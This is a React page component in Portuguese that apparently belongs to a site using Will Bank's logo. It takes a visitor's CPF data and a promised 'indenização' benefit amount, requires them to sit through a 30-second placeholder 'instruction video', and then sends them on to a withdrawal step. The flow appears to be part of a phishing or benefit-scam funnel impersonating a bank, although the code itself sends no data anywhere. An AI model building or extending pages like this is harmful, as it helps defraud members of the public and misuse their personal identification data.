import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Play, ArrowRight, Clock, AlertCircle } from "lucide-react";
import willbankLogo from "@/assets/willbank-logo.png";
import { CPFData } from "@/lib/cpf";

const Video = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [isPlaying, setIsPlaying] = useState(false);
  const [canContinue, setCanContinue] = useState(false);
  const [timeRemaining, setTimeRemaining] = useState(30);

  const cpfData: CPFData | undefined = location.state?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio;

  useEffect(() => {
    if (!cpfData || !valorBeneficio) {
      navigate("/");
      return;
    }
  }, [cpfData, valorBeneficio, navigate]);

  useEffect(() => {
    let timer: NodeJS.Timeout;
    
    if (isPlaying && timeRemaining > 0) {
      timer = setInterval(() => {
        setTimeRemaining((prev) => {
          if (prev <= 1) {
            setCanContinue(true);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }

    return () => clearInterval(timer);
  }, [isPlaying, timeRemaining]);

  const handlePlay = () => {
    setIsPlaying(true);
  };

  const handleContinuar = () => {
    navigate("/saque", { state: { cpfData, valorBeneficio } });
  };

  if (!cpfData || !valorBeneficio) return null;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <header className="bg-card border-b border-border px-6 py-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-between mb-4">
            <img src={willbankLogo} alt="Will Bank" className="h-10 object-contain" />
          </div>
          <div className="flex items-center gap-2 text-sm text-muted-foreground">
            <span>Benefício</span>
            <span>›</span>
            <span>Indenização</span>
            <span>›</span>
            <span className="text-foreground font-medium">Instruções</span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <Card className="w-full max-w-lg shadow-xl border-0 overflow-hidden">
          <div className="bg-primary h-2" />
          
          <CardContent className="p-6 sm:p-8 space-y-6">
            <div className="text-center space-y-2">
              <h1 className="text-2xl font-bold text-foreground">
                Instruções importantes
              </h1>
              <p className="text-muted-foreground">
                Assista ao vídeo abaixo para saber como realizar o saque do seu benefício
              </p>
            </div>

            {/* Video Player */}
            <div className="relative aspect-video bg-black rounded-xl overflow-hidden">
              {!isPlaying ? (
                <button
                  onClick={handlePlay}
                  className="absolute inset-0 flex flex-col items-center justify-center bg-gradient-to-b from-black/50 to-black/80 hover:from-black/40 hover:to-black/70 transition-all"
                >
                  <div className="w-20 h-20 bg-primary rounded-full flex items-center justify-center mb-4 hover:scale-110 transition-transform">
                    <Play className="w-10 h-10 text-primary-foreground ml-1" />
                  </div>
                  <span className="text-white font-medium">Clique para assistir</span>
                </button>
              ) : (
                <div className="absolute inset-0 flex flex-col items-center justify-center bg-gradient-to-b from-gray-900 to-black">
                  {/* Placeholder video content */}
                  <div className="text-center text-white px-6">
                    <AlertCircle className="w-12 h-12 mx-auto mb-4 text-primary" />
                    <h3 className="text-lg font-semibold mb-2">
                      Vídeo de Instruções
                    </h3>
                    <p className="text-sm text-gray-300 mb-4">
                      Aguarde o vídeo carregar ou adicione o link do vídeo nas configurações
                    </p>
                    <div className="flex items-center justify-center gap-2 text-primary">
                      <Clock className="w-4 h-4" />
                      <span className="text-sm font-medium">
                        {timeRemaining > 0 ? `Aguarde ${timeRemaining}s...` : "Pronto!"}
                      </span>
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Value Reminder */}
            <div className="bg-primary/10 rounded-lg p-4 text-center border border-primary/20">
              <p className="text-sm text-muted-foreground mb-1">
                Seu benefício disponível:
              </p>
              <p className="text-2xl font-bold text-primary">
                R$ {valorBeneficio.toLocaleString('pt-BR')},00
              </p>
            </div>

            {/* Progress / Timer */}
            {isPlaying && !canContinue && (
              <div className="flex items-center justify-center gap-2 text-muted-foreground">
                <Clock className="w-4 h-4 animate-pulse" />
                <span className="text-sm">
                  Aguarde {timeRemaining} segundos para continuar...
                </span>
              </div>
            )}

            {/* CTA Button */}
            <Button 
              onClick={handleContinuar}
              disabled={!canContinue}
              className="w-full h-12 text-base font-semibold"
            >
              {canContinue ? (
                <>
                  Continuar para o saque
                  <ArrowRight className="w-5 h-5" />
                </>
              ) : (
                <>
                  <Clock className="w-5 h-5" />
                  Assista o vídeo para continuar
                </>
              )}
            </Button>

            {!isPlaying && (
              <p className="text-xs text-center text-muted-foreground">
                É obrigatório assistir ao vídeo antes de prosseguir com o saque
              </p>
            )}
          </CardContent>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-primary text-primary-foreground px-6 py-4">
        <div className="max-w-4xl mx-auto text-center">
          <p className="text-sm opacity-80">
            © 2025 Will Bank. Todos os direitos reservados.
          </p>
        </div>
      </footer>
    </div>
  );
};

export default Video;
